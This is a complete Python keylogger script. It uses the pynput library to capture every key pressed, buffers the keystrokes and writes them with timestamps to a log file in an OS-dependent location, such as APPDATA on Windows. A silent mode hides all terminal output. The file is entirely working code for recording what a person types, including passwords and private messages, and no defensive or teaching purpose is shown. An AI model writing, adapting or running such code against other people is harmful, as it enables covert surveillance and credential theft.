from pynput import keyboard
import os
import sys
import threading
import datetime
import platform
import signal
import argparse


# Configurable constants
DEFAULT_BUFFER_SIZE = 50
DEFAULT_FLUSH_INTERVAL = 10  # seconds

# Determine OS and set default log file path
if platform.system() == "Windows":
    DEFAULT_LOG_FILE = os.path.join(os.getenv('APPDATA', os.getcwd()), "keystrokes.log")
elif platform.system() == "Darwin":
    DEFAULT_LOG_FILE = os.path.expanduser("~/Documents/keylog.txt")
else:
    DEFAULT_LOG_FILE = os.path.expanduser("~/keystrokes.log")

buffer = []
buffer_lock = threading.Lock()
timer = None
silent_mode = False
log_file = DEFAULT_LOG_FILE
buffer_size = DEFAULT_BUFFER_SIZE
flush_interval = DEFAULT_FLUSH_INTERVAL
running = True
last_timestamp = datetime.datetime.now()

 # Writes buffered keystrokes to the log file with a timestamp
def write_log():
    global buffer, last_timestamp
    with buffer_lock:
        if not buffer:
            return
        data = "".join(buffer)
        buffer.clear()
    try:
        now = datetime.datetime.now()
        timestamp_line = f"\n\n--- Log Entry at {now.strftime('%Y-%m-%d %H:%M:%S')} ---\n"
        last_timestamp = now
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(timestamp_line + data + "\n")
        if not silent_mode:
            print(f"[LOG] Buffer written to file at {datetime.datetime.now().isoformat()}")
    except Exception as e:
        if not silent_mode:
            print(f"[ERROR] Failed to write log file: {e}", file=sys.stderr)

 # Timer-based function to periodically flush the keystroke buffer
def flush_timer():
    global timer, running
    if not running:
        return
    write_log()
    timer = threading.Timer(flush_interval, flush_timer)
    timer.daemon = True
    timer.start()

 # Converts key press events into string representations
def key_to_str(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        elif key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.enter:
            return "\n"
        elif key == keyboard.Key.tab:
            return "\t"
        elif key == keyboard.Key.backspace:
            return "[BACKSPACE]"
        elif key in (keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l):
            return ""
        else:
            return ""
    except AttributeError:
        return ""

def on_press(key):
    global buffer
    key_str = key_to_str(key)
    if hasattr(key, 'char') and key.char is not None and key.char.isalpha() and key.char.isupper():
        key_str = key.char.upper()
    with buffer_lock:
        buffer.append(key_str)
        if len(buffer) >= buffer_size:
            write_log()

    if not silent_mode:
        print(f"[KEY] {key_str}")

# Stop listener
def on_release(key):
    global running
    if key == keyboard.Key.esc:
        running = False
        write_log()
        if timer:
            timer.cancel()
        return False  

def signal_handler(sig, frame):
    global running
    running = False
    write_log()
    if timer:
        timer.cancel()
    sys.exit(0)

 # Main function to parse arguments and start the keylogger
def main():
    global silent_mode, log_file, buffer_size, flush_interval, timer

    parser = argparse.ArgumentParser(description="Keylogger with periodic flushing and silent mode.")
    parser.add_argument("--silent", action="store_true", help="Disable terminal output.")
    parser.add_argument("--logfile", type=str, default=DEFAULT_LOG_FILE, help="Path to log file.")
    parser.add_argument("--buffersize", type=int, default=DEFAULT_BUFFER_SIZE, help="Buffer size before flushing.")
    parser.add_argument("--flushinterval", type=int, default=DEFAULT_FLUSH_INTERVAL, help="Flush interval in seconds.")
    args = parser.parse_args()

    silent_mode = args.silent
    log_file = args.logfile
    buffer_size = args.buffersize
    flush_interval = args.flushinterval

    if not silent_mode:
        print(f"[INFO] Logging to {log_file}")
        print(f"[INFO] Buffer size: {buffer_size}")
        print(f"[INFO] Flush interval: {flush_interval} seconds")

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    timer = threading.Timer(flush_interval, flush_timer)
    timer.daemon = True
    timer.start()

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()